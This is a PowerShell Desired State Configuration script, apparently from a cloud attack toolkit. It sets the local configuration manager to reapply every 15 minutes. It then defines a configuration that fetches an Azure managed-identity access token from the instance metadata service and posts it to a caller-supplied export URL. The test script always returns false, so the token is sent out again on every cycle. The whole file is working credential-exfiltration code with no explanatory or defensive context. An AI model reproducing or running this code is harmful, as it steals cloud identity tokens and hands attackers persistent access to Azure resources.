#Check if there is an existing config. If this command completes successfully, bail out
$type = Get-DscConfigurationStatus | select -ExpandProperty Type
if ( $? -and ($type -ne 'Initial'))
{
    exit
}

[DscLocalConfigurationManager()]
Configuration DscMetaConfigs
{
    Node localhost
    {
        Settings
        {
             RefreshFrequencyMins           = 30
             RefreshMode                    = 'PUSH'
             ConfigurationMode              = 'ApplyAndAutoCorrect'
             AllowModuleOverwrite           = $False
             RebootNodeIfNeeded             = $False
             ActionAfterReboot              = 'ContinueConfiguration'
             ConfigurationModeFrequencyMins = 15
        }
    }
}
DscMetaConfigs -Output .\output\
Set-DscLocalConfigurationManager -Path .\output\

Configuration ExportManagedIdentityToken
{
	
	param
    (
        [String]
        $ExportURL
    )
	
	Import-DscResource -ModuleName 'PSDesiredStateConfiguration'

	Node localhost
	{
		
		Script ScriptExample
		{
			SetScript = {
				$metadataResponse = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
				[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
				Invoke-RestMethod -Method 'Post' -URI $using:ExportURL -Body $metadataResponse.Content -ContentType "application/json"
			}
			TestScript = { 
				return $false 	
			}
			GetScript = { return @{result = 'result'} }
		}
	}
}
